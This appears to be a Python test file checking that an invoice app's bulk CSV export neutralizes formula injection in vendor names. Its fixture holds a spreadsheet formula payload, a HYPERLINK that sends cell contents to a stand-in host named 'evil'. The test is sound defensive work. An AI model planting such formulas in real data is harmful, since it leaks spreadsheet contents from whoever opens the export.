"""POST /api/invoices/bulk/export must neutralize CSV formula injection.

A vendor is attacker-controlled (AI-extracted from an external invoice). If it
names itself with a leading `=`/`+`/`-`/`@`, an unescaped cell executes when a
CFO opens the export in Excel (CWE-1236, issue #172). The bulk CSV export routes
every cell through `report_export.csv_safe_cell`.
"""

from __future__ import annotations

import csv
import io
import uuid
from decimal import Decimal

from app.models.invoice import Invoice, InvoiceStatus


async def _seed(mk, org_id, *, vendor_name: str) -> uuid.UUID:
    inv_id = uuid.uuid4()
    async with mk() as s:
        s.add(
            Invoice(
                id=inv_id,
                organization_id=org_id,
                invoice_number=f"INV-{uuid.uuid4().hex[:8]}",
                vendor_name=vendor_name,
                amount=Decimal("500.00"),
                currency="USD",
                status=InvoiceStatus.approved,
            )
        )
        await s.commit()
    return inv_id


async def test_bulk_csv_export_quotes_formula_vendor_name(realdb):
    mk = realdb.sessionmaker("a")
    org_id = realdb.info("a").org_id
    evil = '=HYPERLINK("http://evil/"&A1,"x")'
    inv_id = await _seed(mk, org_id, vendor_name=evil)

    async with realdb.client(key="a", role="ap_manager") as c:
        resp = await c.post(
            "/api/invoices/bulk/export", json={"ids": [str(inv_id)], "format": "csv"}
        )
    assert resp.status_code == 200, resp.text
    rows = list(csv.reader(io.StringIO(resp.text)))
    header = rows[0]
    vcol = header.index("vendor")
    # The vendor cell is rendered as literal text (leading single quote), not a
    # live formula.
    assert rows[1][vcol] == "'" + evil
